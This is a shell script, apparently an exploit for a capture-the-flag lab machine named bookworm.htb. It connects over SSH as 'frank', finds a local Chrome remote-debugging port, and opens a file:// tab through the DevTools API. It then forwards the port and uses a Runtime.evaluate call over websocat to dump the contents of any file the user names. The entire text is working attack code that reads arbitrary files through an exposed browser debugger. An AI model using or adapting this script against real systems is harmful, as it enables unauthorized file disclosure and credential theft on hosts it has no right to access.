#!/usr/bin/env sh

function createFileTab() {
    filepath=$1
    socketCmd="ss -tunlp | grep -Eo '127.0.0.1:[0-9]{5}'"
    /usr/bin/ssh "frank@bookworm.htb" "export chrome=\$($socketCmd); curl -sX PUT \"http://\$chrome/json/new?file://$filepath\""
}

function getContent() {
    webSocketUrl=$1
    echo '{"id": 1234, "method": "Runtime.evaluate", "params": {"expression": "document.documentElement.outerHTML"}}' | /usr/bin/websocat -n1 "$webSocketUrl"
}

echo "Enter the file to read:"
read filepath

jsonResponse=$(createFileTab $filepath)
webSocketUrl=$(echo $jsonResponse | jq -r ".webSocketDebuggerUrl")
debuggerPort=$(echo "$webSocketUrl" | grep -oE ":[0-9]{5}" | tr -d ":")
webUrl=$(echo $jsonResponse | jq -r ".devtoolsFrontendUrl")

/usr/bin/ssh "frank@bookworm.htb" -f -L "$debuggerPort:127.0.0.1:$debuggerPort" "sleep 20"

response=$(getContent $webSocketUrl)
echo $response | jq -r ".result.result.value"
killall ssh
